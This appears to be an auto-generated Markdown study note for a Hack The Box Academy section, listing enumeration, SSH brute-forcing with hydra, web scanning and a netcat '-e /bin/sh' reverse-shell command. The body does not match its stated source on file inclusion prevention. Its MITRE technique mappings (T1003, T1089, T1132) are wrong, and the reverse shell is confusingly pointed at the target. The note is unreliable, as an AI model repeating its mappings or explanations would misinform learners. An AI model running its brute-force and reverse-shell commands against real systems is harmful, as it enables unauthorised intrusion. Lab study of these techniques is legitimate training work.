---
title: Hack The Box - Academy Module 23 Section 622
aliases: []
tags:
- topic/hack-the-box-academy
- topic/active-enumeration
category: study_notes
status: draft
date_created: '2026-08-27'
date_modified: '2026-08-27'
source: 20-23-FileInclusion-10-FileInclusionPrevention.pdf
related_tools:
- '[[ffuf]]'
- '[[nmap-1787746090]]'
- '[[netcat]]'
- '[[net]]'
- '[[dirb]]'
- '[[nikto]]'
- '[[wpscan]]'
related_techniques:
- '[[t1003]]'
- '[[t1089]]'
- '[[t1132]]'
related_tactics:
- '[[ta0005]]'
related_services:
- '[[http]]'
- '[[https]]'
- '[[ftp]]'
related_os: []
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: ''
---

# Hack The Box - Academy Module 23 Section 622

## Overview
This section covers the enumeration of the target machine, including the use of tools like ffuf, nmap, netcat, net, dirb, nikto, and wpscan. The techniques used include active enumeration, brute-forcing, and web application attacks.

## Active Enumeration
The active enumeration phase involves using tools such as ffuf and nmap to identify open ports and services. The following commands are used:

```bash
ffuf -w wordlist.txt -u http://<target>/FUZZ
nmap -sV -p- <target>
```

The output from these commands helps in identifying potential targets for further exploitation.

## Brute-Forcing
Brute-forcing is used to gain access to the target machine. The following commands are used to brute-force the SSH service:

```bash
hydra -L users.txt -P passwords.txt ssh://<target>
```

Once the credentials are obtained, the following commands are used to gain a shell:

```bash
ssh <username>@<target>
netcat -e /bin/sh <target_ip> <port>
```

The netcat command is used to establish a reverse shell.

## Web Application Attacks
The web application is attacked using tools like nikto and wpscan. The following commands are used to scan the web application for vulnerabilities:

```bash
nikto -h http://<target>
wpscan --url http://<target>
```

These tools help in identifying potential vulnerabilities that can be exploited.

## Post-Exploitation
Once the target is compromised, the following techniques are used to maintain access and escalate privileges:

- **T1003**: Use of credentials to establish a foothold on the target machine.
- **T1089**: Use of a web shell to gain access to the target machine.
- **T1132**: Use of a reverse shell to maintain access.

## References
- https://academy.hackthebox.com/module/23/section/622

